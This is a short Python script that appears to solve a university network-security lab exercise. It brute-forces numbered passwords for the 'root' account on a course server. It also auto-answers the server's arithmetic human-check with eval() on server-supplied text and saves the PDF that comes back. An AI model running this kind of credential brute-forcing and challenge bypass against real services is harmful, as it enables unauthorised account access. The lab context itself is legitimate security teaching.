#!/usr/bin/env python3
import socket
from binascii import hexlify, unhexlify
import re

HOST = 'netsec.net.in.tum.de'
PORT = 20003


#username = input("Username (hint: root): ")
#password = input("Password (hint: PasswordXX, X=0-9): ")

username="root"
password="Password"

for x in range(0, 99):
    if x < 10:
        credentials=username+",Password0"+str(x)
    else:
        credentials=username+",Password"+str(x)
#credentials=username+","+password

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    sf = s.makefile("rw")  # we use a file abstraction for the sockets


    sf.write("{}\n".format(credentials))
    sf.flush()


    challenge = sf.readline().rstrip('\n')

    print("Solve the following equation to prove you are human: ", challenge)
#response=input("Solution: ")
 #   exec(challenge)
	# first we need to check if the challenge is valid

    if bool(re.search('[a-zA-Z]', challenge)) :
        print("The following challenge is invalid : "+challenge)
        continue
    response=str(eval(challenge))
    print("Solution: "+response)
    sf.write("{}\n".format(response))
    sf.flush()


    data = sf.readline().rstrip('\n')
    print("From Server: `{}'".format(data))

    data = sf.readline().rstrip('\n')
    print("From Server: received {} bytes".format(len(data)))
    if len(data) ==0:
        continue
    data = unhexlify(data)

    pdf_hdr = b'%PDF-1.5'

    if len(data) >= len(pdf_hdr) and data[:len(pdf_hdr)] == pdf_hdr:
        print("Looks like we got a PDF!")
        f = open("output.pdf","wb")
        f.write(data)
        f.close()

    sf.close()
    s.close()


    s.close()
